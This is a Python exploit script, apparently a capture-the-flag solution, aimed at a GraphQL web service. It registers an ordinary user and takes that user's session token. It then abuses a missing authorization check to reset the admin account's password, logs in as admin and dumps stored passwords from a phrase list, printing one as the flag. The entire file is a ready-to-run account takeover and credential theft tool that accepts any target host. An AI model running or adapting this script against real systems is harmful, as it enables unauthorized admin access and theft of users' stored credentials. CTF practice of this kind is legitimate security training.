import requests
import sys
import re

url = sys.argv[1]
url_register = f"http://{url}/graphql"
url_albercik_login = f"http://{url}/graphql"
url_admin_login = f"http://{url}/graphql"
url_change_pass = f"http://{url}/graphql"
url_flag = f"http://{url}/graphql"
#register user albercik

register_headers = { "Content-type": "application/json"}
register_data = {
    "query":"mutation($email: String!, $username: String!, $password: String!) { RegisterUser(email: $email, username: $username, password: $password) { message } }","variables":{"email":"albercik@nthw.nthw","username":"albercik","password":"albercik"}
}
r_register = requests.post(url_register, json=register_data, headers=register_headers)
print("[+] User albercik registered!")

# login albercik
albercik_login_headers = { "Content-type": "application/json"}
albercik_login_data = {
    "query":"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }","variables":{"username":"albercik","password":"albercik"}
}
r_login_albercik = requests.post(url_albercik_login, json=albercik_login_data, headers=albercik_login_headers)

print("[+] User albercik logged in!")
#jwt token
JWT = r_login_albercik.text
jwt_token = re.search(r'"token"\s*:\s*"([^"]+)"', JWT).group(1)

print("[+] Got albercik JWT!")
#admin changing password

admin_change_headers = {
    "Content-type": "application/json",
    "Cookie": f"session={jwt_token}"
}
admin_change_data = {
    "query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"albercik"}
}

r_change = requests.post(url_change_pass, json=admin_change_data, headers=admin_change_headers)

print("[+] Changed admin password!")
#login admin
admin_login_headers = { "Content-type": "application/json"}
admin_login_data = {
    "query":"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"albercik"}
}

r_login_admin = requests.post(url_admin_login, json=admin_login_data, headers=admin_login_headers)

# grab admin jwt token
JWT2 = r_login_admin.text
jwt_token2 = re.search(r'"token"\s*:\s*"([^"]+)"', JWT2).group(1)

print("[+] Got admin JWT!")
# get flag 
admin_flag_headers = {
    "Content-type": "application/json",
    "Cookie": f"session={jwt_token2}"
}

flag_data = {
    "query":"{ getPhraseList { id, owner, type, address, username, password, note } }"
}
r_flag = requests.post(url_flag, json=flag_data, headers=admin_flag_headers)

flag = r_flag.text
flag_1 = re.search(r'"password"\s*:\s*"([^"]+)"', flag).group(1)

print("[+] Exploit successfully works! here is your flag: ")
print("")
print(flag_1)
